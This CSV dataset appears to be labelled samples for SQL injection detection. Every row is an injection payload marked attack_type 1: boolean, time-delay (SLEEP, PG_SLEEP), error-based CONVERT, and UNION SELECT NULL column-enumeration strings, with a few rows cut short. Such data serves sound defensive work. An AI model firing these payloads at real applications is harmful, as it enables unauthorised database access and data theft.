sentence,attack_type,len_payload
'  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 'VkOS,1,85
'  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 'VkOS' = 'VkOS,1,94
  )  )   )  AND 93 = 93 AND   (  (   ( 2816 = 2816,1,48
'  )  )   )  AND 93 = 93 AND   (  (   ( 'oMMM' = 'oMMM,1,54
'  )  )   )  AND 93 = 93 AND   (  (   ( 'UFCU' LIKE 'UFCU,1,57
  )  )   )  AND 9346 = 2080-- AND   (  (   ( 7093 = 7093,1,54
'  )  )   )  AND 9373 = 4888# AND   (  (   ( 'FDxz' = 'FDxz,1,59
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'mBsh' = 'mBsh",1,299
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'hZcS' LIKE 'hZcS",1,302
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'mBsh' = 'mBsh",1,299
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'hZcS' LIKE 'hZcS",1,302
"  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 9401 = 9401",1,293
"  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 9401 = 9401",1,293
'  )  )   )  AND 9421 = 9484 AND   (  (   ( 'ZaIT' = 'ZaIT,1,58
  )  )   )  AND 9563 = 2025 AND   (  (   ( 4031 = 4031,1,52
  )  )   )  AND SLEEP ( 5 ) --  AND   (  (   ( 2542 = 2542,1,56
'  )  )   )  AND SLEEP ( 5 ) --  AND   (  (   ( 'atDr' = 'atDr,1,62
'  )  )   )  AND SLEEP ( 5 ) --  AND   (  (   ( 'suST' LIKE 'suST,1,65
  )  )   )  AND SLEEP ( 5 )  AND   (  (   ( 848 = 848,1,51
'  )  )   )  AND SLEEP ( 5 )  AND   (  (   ( 'gpfJ' = 'gpfJ,1,59
'  )  )   )  AND SLEEP ( 5 )  AND   (  (   ( 'wvIN' LIKE 'wvIN,1,62
  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 5602 = 5602,1,60
  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 6917 = 6917,1,60
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'ABHW' = 'ABHW,1,66
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'iKCR' LIKE 'iKCR,1,69
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'qmQq' = 'qmQq,1,66
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'uhFb' LIKE 'uhFb,1,69
  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 6496 = 6496,1,59
  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 7727 = 7727,1,59
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'mvvE' LIKE 'mvvE,1,68
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'okQW' LIKE 'okQW,1,68
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'rxUo' = 'rxUo,1,65
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'YbIT' = 'YbIT,1,65
"  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 1698 = 1698",1,66
"  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 2149 = 2149",1,66
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'RHnQ' LIKE 'RHnQ",1,75
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'wGuu' = 'wGuu",1,72
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'WpyD' LIKE 'WpyD",1,75
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'yJUV' = 'yJUV",1,72
"  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 6490 = 6490",1,65
"  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 9524 = 9524",1,65
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'cKqd' LIKE 'cKqd",1,74
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'crTV' LIKE 'crTV",1,74
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'jTOk' = 'jTOk",1,71
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'nZwi' = 'nZwi",1,71
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 5044 = 5044",1,72
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 7672 = 7672",1,72
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'jarF' LIKE 'jarF",1,81
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'lMmh' = 'lMmh",1,78
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'nAut' LIKE 'nAut",1,81
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'uMVf' = 'uMVf",1,78
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 5144 = 5144",1,71
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 9606 = 9606",1,71
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'Jrrv' LIKE 'Jrrv",1,80
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'qIam' = 'qIam",1,77
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'TguG' = 'TguG",1,77
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'Utjd' LIKE 'Utjd",1,80
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 1322 = 1322",1,78
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 5424 = 5424",1,78
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'LoPY' LIKE 'LoPY",1,87
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'TjRv' = 'TjRv",1,84
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'vmoF' = 'vmoF",1,84
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'YDjm' LIKE 'YDjm",1,87
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2621 = ",1,72
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2621 = 2621",1,77
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2686 = ",1,72
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2686 = 2686",1,77
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'DfQT' = 'DfQT",1,83
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'GURC' LIKE 'GURC",1,86
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'NQFt' = 'NQFt",1,83
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'oKll' LIKE 'oKll",1,86
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 5794 = 5794",1,84
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6801 = 6801",1,84
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'dKLo' LIKE 'dKLo",1,93
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'KUsu' = 'KUsu",1,90
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'lFxr' LIKE 'lFxr",1,93
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'pRqL' = 'pRqL",1,90
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (  ",1,67
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 3429 = 3429",1,83
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7386 = 7386",1,83
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'lZQa' = 'lZQa",1,89
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'QqSw' = 'QqSw",1,89
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'rvZu' LIKE 'rvZu",1,92
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'YUuH' LIKE 'YUuH",1,92
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 1758 = 1758",1,90
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6957 = 6957",1,90
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'Kgqz' = 'Kgqz",1,96
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'MElC' = 'MElC",1,96
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'sYJP' LIKE 'sYJP",1,99
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'VvGL' LIKE 'VvGL",1,99
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#",1,65
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# ",1,62
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2060 = 2060",1,89
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 3181 = 3181",1,89
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Aomr' LIKE 'Aomr",1,98
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Dgvq' = 'Dgvq",1,95
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'QRyq' LIKE 'QRyq",1,98
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'UPKL' = 'UPKL",1,95
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6693 = 6693",1,96
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 917 = 917",1,94
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'nsCb' = 'nsCb",1,102
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'uaeU' LIKE 'uaeU",1,105
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'yKIx' = 'yKIx",1,102
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'znUJ' LIKE 'znUJ",1,105
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 1078 = 1078",1,95
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7701 = 7701",1,95
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'CznY' LIKE 'CznY",1,104
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'oBeE' = 'oBeE",1,101
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'SVHv' = 'SVHv",1,101
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'YVDB' LIKE 'YVDB",1,104
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 1371 = 1371",1,102
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 403 = 403",1,100
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'jMeV' LIKE 'jMeV",1,111
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'KoQn' LIKE 'KoQn",1,111
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'nFdK' = 'nFdK",1,108
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'zEzg' = 'zEzg",1,108
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5403 = 5403",1,101
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7790 = 7790",1,101
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'bKUm' = 'bKUm",1,107
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'hHNs' LIKE 'hHNs",1,110
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'pPHu' LIKE 'pPHu",1,110
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'qcju' = 'qcju",1,107
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 8557 = 8557",1,108
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 9181 = 9181",1,108
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'PyWA' = 'PyWA",1,114
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'YCGp' LIKE 'YCGp",1,117
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'YpBC' = 'YpBC",1,114
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'ZlUG' LIKE 'ZlUG",1,117
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2906 = 2906",1,107
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5473 = 5473",1,107
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'eBka' = 'eBka",1,113
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Fbdy' = 'Fbdy",1,113
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'isvX' LIKE 'isvX",1,116
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'rWOf' LIKE 'rWOf",1,116
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 5338 = 5338",1,114
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 7442 = 7442",1,114
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'DPSa' LIKE 'DPSa",1,123
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'pzvT' = 'pzvT",1,120
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'qPKT' LIKE 'qPKT",1,123
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'wrni' = 'wrni",1,120
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2062 = 2062",1,113
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7050 = 7050",1,113
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'fpyt' LIKE 'fpyt",1,122
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'IOYc' = 'IOYc",1,119
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'iQuJ' LIKE 'iQuJ",1,122
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'NsaY' = 'NsaY",1,119
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 270 = 270",1,118
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 7174 = 7174",1,120
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'esYe' LIKE 'esYe",1,129
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'eYIP' = 'eYIP",1,126
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'tPDj' = 'tPDj",1,126
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'vHKJ' LIKE 'vHKJ",1,129
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 4184 = 4184",1,119
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'CzUq' = 'CzUq",1,125
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Hugb' LIKE 'Hugb",1,128
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'PRaw' = 'PRaw",1,125
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'scYM' LIKE 'scYM",1,128
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 4913 = 4913",1,126
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 5689 = 5689",1,126
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'FwYl' LIKE 'FwYl",1,135
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'QCFA' = 'QCFA",1,132
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'rMAu' = 'rMAu",1,132
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'sPbK' LIKE 'sPbK",1,135
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2028 = 2028",1,125
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'edFa' LIKE 'edFa",1,134
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'FofE' = 'FofE",1,131
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'GTZl' = 'GTZl",1,131
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'VUoP' LIKE 'VUoP",1,134
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 541 = 541",1,130
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6741 = 6741",1,132
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'bvqX' = 'bvqX",1,138
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'ciLF' LIKE 'ciLF",1,141
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'HBWh' LIKE 'HBWh",1,141
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'IClw' = 'IClw",1,138
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 9385 = 9385",1,131
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'oUWm' = 'oUWm",1,137
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'RcxF' LIKE 'RcxF",1,140
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'wBPo' = 'wBPo",1,137
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'wcUy' LIKE 'wcUy",1,140
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6519 = 6519",1,138
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 7120 = 7120",1,138
